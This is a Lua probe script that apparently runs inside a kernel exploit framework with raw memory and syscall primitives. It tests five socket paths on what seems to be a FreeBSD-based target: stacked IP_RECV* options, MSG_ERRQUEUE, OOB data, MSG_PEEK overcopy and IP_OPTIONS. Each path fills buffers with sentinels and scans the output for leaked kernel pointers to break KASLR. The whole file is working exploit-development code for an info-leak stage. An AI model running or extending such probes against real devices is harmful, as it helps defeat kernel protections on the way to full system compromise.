-- CRASH_CLASS: LOW
-- PROBE 69q: recvmsg ancillary data KASLR scan (untested options)
--
-- Prior scans tested SCM_CREDS, SO_TIMESTAMP, SO_BINTIME — all clean.
-- This probe tests options NEVER tried:
--   [A] IP_RECVDSTADDR(7) + IP_RECVIF(20) + IP_RECVTTL(65) stacked on UDP
--   [B] MSG_ERRQUEUE (0x2000) on UDP socket after sendto unreachable
--   [C] SO_OOBINLINE + MSG_OOB on TCP loopback
--   [D] MSG_PEEK with oversized buffer on AF_UNIX with data
--   [E] IP_OPTIONS getsockopt after setsockopt (padding/alignment scan)

print("=== PROBE 69q: RECVMSG ANCILLARY DATA KASLR SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS, SIGPIPE
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local function setsockopt_int(fd, level, name, val)
    local vb = memory.alloc(4); wd(N(vb), val)
    local ret = nil
    pcall(function()
        ret = mk(105)(uint64(fd), uint64(level), uint64(name), uint64(N(vb)), uint64(4))
    end)
    return sgn(ret or uint64(0xFFFFFFFF))
end

local function scan_for_kptr(buf_addr, len, label)
    local found = 0
    for off = 0, len - 8, 4 do
        local val = rq(buf_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                found = found + 1
                print(string.format("  *** KPTR *** %s +0x%X = %s", label, off, fmt(val)))
            end
        end
    end
    return found
end

local function sentinel_fill(addr, len, val)
    val = val or 0xDEADBEEF
    for off = 0, len - 4, 4 do
        wd(addr + off, val)
    end
end

local function count_modified(addr, len, sentinel)
    sentinel = sentinel or 0xDEADBEEF
    local count = 0
    for off = 0, len - 4, 4 do
        local v = rd(addr + off)
        if v ~= sentinel then count = count + 1 end
    end
    return count
end

-- ============================================================
-- [A] UDP + IP_RECVDSTADDR + IP_RECVIF + IP_RECVTTL
-- ============================================================
print("")
print("[A] UDP loopback with stacked IP_RECV* options")

local udp_fd = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
print("  UDP fd=" .. udp_fd)

if udp_fd >= 0 then
    -- Bind to loopback:12345
    local sa_in = memory.alloc(16)
    wd(N(sa_in), 0x0210)      -- sin_len=2, sin_family=AF_INET(2)
    wd(N(sa_in) + 2, 0x3930)  -- sin_port=12345 (network byte order = 0x3039)
    wd(N(sa_in) + 4, 0x0100007F) -- 127.0.0.1
    -- Fix port byte order: 12345 = 0x3039, network = 0x3930
    pcall(function() memory.write_byte(N(sa_in), 16) end)
    pcall(function() memory.write_byte(N(sa_in) + 1, 2) end)
    pcall(function() memory.write_byte(N(sa_in) + 2, 0x30) end)
    pcall(function() memory.write_byte(N(sa_in) + 3, 0x39) end)

    local bret = sgn(mk(104)(uint64(udp_fd), uint64(N(sa_in)), uint64(16)))
    print("  bind=" .. bret)

    -- Set IP_RECVDSTADDR(7), IP_RECVIF(20), IP_RECVTTL(65)
    local IPPROTO_IP = 0
    local r1 = setsockopt_int(udp_fd, IPPROTO_IP, 7, 1)
    local r2 = setsockopt_int(udp_fd, IPPROTO_IP, 20, 1)
    local r3 = setsockopt_int(udp_fd, IPPROTO_IP, 65, 1)
    print(string.format("  setsockopt RECVDSTADDR=%d RECVIF=%d RECVTTL=%d", r1, r2, r3))

    -- sendto self
    local msg = memory.alloc(32)
    for i = 0, 28, 4 do wd(N(msg) + i, 0x41424344) end
    local sret = sgn(mk(133)(uint64(udp_fd), uint64(N(msg)), uint64(16),
        uint64(0), uint64(N(sa_in)), uint64(16)))
    print("  sendto=" .. sret)

    -- recvmsg
    local recv_data = memory.alloc(256); sentinel_fill(N(recv_data), 256)
    local iov = memory.alloc(16)
    wq(N(iov), uint64(N(recv_data))); wq(N(iov) + 8, uint64(256))
    local ctrl = memory.alloc(512); sentinel_fill(N(ctrl), 512)
    local from_addr = memory.alloc(64); sentinel_fill(N(from_addr), 64)

    local msghdr = memory.alloc(0x38)
    wq(N(msghdr), uint64(N(from_addr)))      -- msg_name
    wd(N(msghdr) + 8, 64)                     -- msg_namelen
    wq(N(msghdr) + 0x10, uint64(N(iov)))     -- msg_iov
    wq(N(msghdr) + 0x18, uint64(1))          -- msg_iovlen
    wq(N(msghdr) + 0x20, uint64(N(ctrl)))    -- msg_control
    wd(N(msghdr) + 0x28, 512)                 -- msg_controllen
    wd(N(msghdr) + 0x30, 0)                   -- msg_flags

    local rret = sgn(mk(27)(uint64(udp_fd), uint64(N(msghdr)), uint64(0)))
    local ctl_len = rd(N(msghdr) + 0x28) or 0
    local flags_out = rd(N(msghdr) + 0x30) or 0
    print(string.format("  recvmsg=%d controllen=%d flags=0x%X", rret, ctl_len, flags_out))

    if ctl_len > 0 then
        local mod = count_modified(N(ctrl), math.min(ctl_len + 32, 512), 0xDEADBEEF)
        print(string.format("  %d dwords modified in control buffer (%d bytes)", mod, ctl_len))
        -- Dump first 128 bytes of control
        print("  control hex:")
        for off = 0, math.min(ctl_len + 16, 127), 4 do
            local v = rd(N(ctrl) + off)
            if v then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
        local kp = scan_for_kptr(N(ctrl), math.min(ctl_len + 32, 512), "ctrl")
        print(string.format("  kernel pointers in control: %d", kp))
    else
        print("  no control data returned")
    end

    -- Scan from_addr too
    local fa_mod = count_modified(N(from_addr), 64, 0xDEADBEEF)
    if fa_mod > 0 then
        local kp2 = scan_for_kptr(N(from_addr), 64, "from_addr")
        print(string.format("  from_addr: %d modified, %d kptr", fa_mod, kp2))
    end

    pcall(function() mk(6)(uint64(udp_fd)) end)
end

if not alive() then print("DEAD after A"); return end

-- ============================================================
-- [B] MSG_ERRQUEUE on UDP
-- ============================================================
print("")
print("[B] UDP MSG_ERRQUEUE after sendto unreachable")

local udp2 = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
print("  UDP fd=" .. udp2)

if udp2 >= 0 then
    -- IP_RECVERR = 0x20 (Linux) / not standard on FreeBSD
    local r_err = setsockopt_int(udp2, 0, 0x20, 1)
    print("  setsockopt IP_RECVERR(0x20)=" .. r_err)

    -- sendto 127.0.0.1:1 (likely unreachable port)
    local sa2 = memory.alloc(16)
    pcall(function() memory.write_byte(N(sa2), 16) end)
    pcall(function() memory.write_byte(N(sa2) + 1, 2) end)
    pcall(function() memory.write_byte(N(sa2) + 2, 0) end)
    pcall(function() memory.write_byte(N(sa2) + 3, 1) end)
    wd(N(sa2) + 4, 0x0100007F)

    local pkt = memory.alloc(16)
    wd(N(pkt), 0x45454545)
    pcall(function()
        mk(133)(uint64(udp2), uint64(N(pkt)), uint64(8), uint64(0), uint64(N(sa2)), uint64(16))
    end)

    -- Small delay for ICMP unreachable to arrive
    for w = 1, 50000 do end

    -- recvmsg with MSG_ERRQUEUE = 0x2000
    local recv2 = memory.alloc(256); sentinel_fill(N(recv2), 256)
    local iov2 = memory.alloc(16)
    wq(N(iov2), uint64(N(recv2))); wq(N(iov2) + 8, uint64(256))
    local ctrl2 = memory.alloc(512); sentinel_fill(N(ctrl2), 512)
    local msghdr2 = memory.alloc(0x38)
    wq(N(msghdr2), uint64(0))
    wd(N(msghdr2) + 8, 0)
    wq(N(msghdr2) + 0x10, uint64(N(iov2)))
    wq(N(msghdr2) + 0x18, uint64(1))
    wq(N(msghdr2) + 0x20, uint64(N(ctrl2)))
    wd(N(msghdr2) + 0x28, 512)
    wd(N(msghdr2) + 0x30, 0)

    local rret2 = sgn(mk(27)(uint64(udp2), uint64(N(msghdr2)), uint64(0x2000)))
    local ctl2_len = rd(N(msghdr2) + 0x28) or 0
    print(string.format("  recvmsg(MSG_ERRQUEUE)=%d controllen=%d", rret2, ctl2_len))

    if ctl2_len > 0 then
        print("  errqueue control hex:")
        for off = 0, math.min(ctl2_len + 16, 127), 4 do
            local v = rd(N(ctrl2) + off)
            if v then print(string.format("    +0x%02X: 0x%08X", off, v)) end
        end
        local kp = scan_for_kptr(N(ctrl2), math.min(ctl2_len + 32, 512), "errqueue")
        print(string.format("  kernel pointers: %d", kp))
    end

    -- Also try regular recvmsg
    local rret2b = sgn(mk(27)(uint64(udp2), uint64(N(msghdr2)), uint64(0)))
    print(string.format("  recvmsg(0)=%d", rret2b))

    pcall(function() mk(6)(uint64(udp2)) end)
end

if not alive() then print("DEAD after B"); return end

-- ============================================================
-- [C] TCP OOB data with SO_OOBINLINE
-- ============================================================
print("")
print("[C] TCP SO_OOBINLINE + OOB data")

local sp3 = memory.alloc(16)
wd(N(sp3), 0xFFFFFFFF); wd(N(sp3) + 4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), uint64(N(sp3))) end)
local oob_r = sgn(rd(N(sp3)) or 0xFFFFFFFF)
local oob_w = sgn(rd(N(sp3) + 4) or 0xFFFFFFFF)
print(string.format("  unix stream pair: r=%d w=%d", oob_r, oob_w))

if oob_r >= 0 and oob_w >= 0 then
    -- SO_OOBINLINE = 0x100, SOL_SOCKET = 0xFFFF
    local r_oob = setsockopt_int(oob_r, 0xFFFF, 0x100, 1)
    print("  SO_OOBINLINE=" .. r_oob)

    -- Send OOB data (MSG_OOB = 0x1)
    local oob_data = memory.alloc(8)
    wd(N(oob_data), 0x41)
    pcall(function()
        mk(28)(uint64(oob_w), uint64(N(oob_data)), uint64(1), uint64(1))
    end)

    -- Also send regular data
    wd(N(oob_data), 0x42424242)
    pcall(function()
        mk(4)(uint64(oob_w), uint64(N(oob_data)), uint64(4))
    end)

    -- recvmsg on reader
    local recv3 = memory.alloc(128); sentinel_fill(N(recv3), 128)
    local iov3 = memory.alloc(16)
    wq(N(iov3), uint64(N(recv3))); wq(N(iov3) + 8, uint64(128))
    local ctrl3 = memory.alloc(256); sentinel_fill(N(ctrl3), 256)
    local msghdr3 = memory.alloc(0x38)
    wq(N(msghdr3), uint64(0)); wd(N(msghdr3) + 8, 0)
    wq(N(msghdr3) + 0x10, uint64(N(iov3)))
    wq(N(msghdr3) + 0x18, uint64(1))
    wq(N(msghdr3) + 0x20, uint64(N(ctrl3)))
    wd(N(msghdr3) + 0x28, 256)
    wd(N(msghdr3) + 0x30, 0)

    local rret3 = sgn(mk(27)(uint64(oob_r), uint64(N(msghdr3)), uint64(0)))
    local ctl3_len = rd(N(msghdr3) + 0x28) or 0
    local flags3 = rd(N(msghdr3) + 0x30) or 0
    print(string.format("  recvmsg=%d controllen=%d flags=0x%X", rret3, ctl3_len, flags3))

    if ctl3_len > 0 then
        local kp = scan_for_kptr(N(ctrl3), math.min(ctl3_len + 32, 256), "oob_ctrl")
        print(string.format("  OOB control kptr: %d", kp))
    end

    -- Check data area for contamination
    local data_mod = count_modified(N(recv3), 128, 0xDEADBEEF)
    if data_mod > 0 then
        local kp2 = scan_for_kptr(N(recv3), 128, "oob_data")
        print(string.format("  data modified=%d kptr=%d", data_mod, kp2))
    end

    pcall(function() mk(6)(uint64(oob_r)) end)
    pcall(function() mk(6)(uint64(oob_w)) end)
end

if not alive() then print("DEAD after C"); return end

-- ============================================================
-- [D] MSG_PEEK with oversized buffer on AF_UNIX
-- ============================================================
print("")
print("[D] MSG_PEEK with oversized buffer on AF_UNIX")

local sp4 = memory.alloc(16)
wd(N(sp4), 0xFFFFFFFF); wd(N(sp4) + 4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp4))) end)
local peek_r = sgn(rd(N(sp4)) or 0xFFFFFFFF)
local peek_w = sgn(rd(N(sp4) + 4) or 0xFFFFFFFF)

if peek_r >= 0 and peek_w >= 0 then
    -- Write 8 bytes of data
    local wdata = memory.alloc(8)
    wd(N(wdata), 0xCAFEBABE); wd(N(wdata) + 4, 0xDEADC0DE)
    pcall(function() mk(4)(uint64(peek_w), uint64(N(wdata)), uint64(8)) end)

    -- MSG_PEEK with 4KB buffer (much larger than 8B data)
    local peek_buf = memory.alloc(0x1000); sentinel_fill(N(peek_buf), 0x1000)
    local rret4 = sgn(mk(3)(uint64(peek_r), uint64(N(peek_buf)), uint64(0x1000),
        uint64(2)))  -- MSG_PEEK = 0x2
    print(string.format("  recv(MSG_PEEK, 4KB)=%d", rret4))

    -- Check how many bytes modified past the actual data
    local mod_past = 0
    for off = 8, 0xFFC, 4 do
        local v = rd(N(peek_buf) + off)
        if v ~= 0xDEADBEEF then mod_past = mod_past + 1 end
    end
    print(string.format("  bytes past data: %d dwords modified (overcopy)", mod_past))

    if mod_past > 0 then
        local kp = scan_for_kptr(N(peek_buf) + 8, 0x1000 - 8, "peek_overcopy")
        print(string.format("  kernel pointers in overcopy: %d", kp))
    end

    pcall(function() mk(6)(uint64(peek_r)) end)
    pcall(function() mk(6)(uint64(peek_w)) end)
end

if not alive() then print("DEAD after D"); return end

-- ============================================================
-- [E] IP_OPTIONS padding scan
-- ============================================================
print("")
print("[E] IP_OPTIONS get after set — padding/alignment scan")

local udp5 = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
if udp5 >= 0 then
    -- Set 40 bytes of IP_OPTIONS (maximum)
    local opts = memory.alloc(44)
    for i = 0, 39 do
        pcall(function() memory.write_byte(N(opts) + i, 0x44) end)  -- IP option NOP-like
    end
    local sret = setsockopt_int(udp5, 0, 1, 0)  -- just test
    -- IP_OPTIONS = 1, IPPROTO_IP = 0
    local opt_buf = memory.alloc(4)
    wd(N(opt_buf), 40)
    local sret2 = sgn(mk(105)(uint64(udp5), uint64(0), uint64(1),
        uint64(N(opts)), uint64(40)))
    print(string.format("  setsockopt IP_OPTIONS(40B)=%d", sret2))

    -- getsockopt with oversized buffer
    local get_buf = memory.alloc(256); sentinel_fill(N(get_buf), 256)
    local get_len = memory.alloc(4); wd(N(get_len), 256)
    local gret = sgn(mk(118)(uint64(udp5), uint64(0), uint64(1),
        uint64(N(get_buf)), uint64(N(get_len))))
    local got_len = rd(N(get_len)) or 0
    print(string.format("  getsockopt IP_OPTIONS=%d len=%d", gret, got_len))

    if got_len > 0 then
        local mod = count_modified(N(get_buf), math.min(got_len + 32, 256), 0xDEADBEEF)
        print(string.format("  %d dwords modified (%d bytes returned)", mod, got_len))
        local kp = scan_for_kptr(N(get_buf), math.min(got_len + 32, 256), "ip_opts")
        print(string.format("  kernel pointers: %d", kp))

        -- Hex dump first 64 bytes
        for off = 0, math.min(got_len, 63), 4 do
            local v = rd(N(get_buf) + off)
            if v then print(string.format("    +0x%02X: 0x%08X", off, v)) end
        end
    end

    pcall(function() mk(6)(uint64(udp5)) end)
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("")
print("=== PROBE 69q COMPLETE ===")
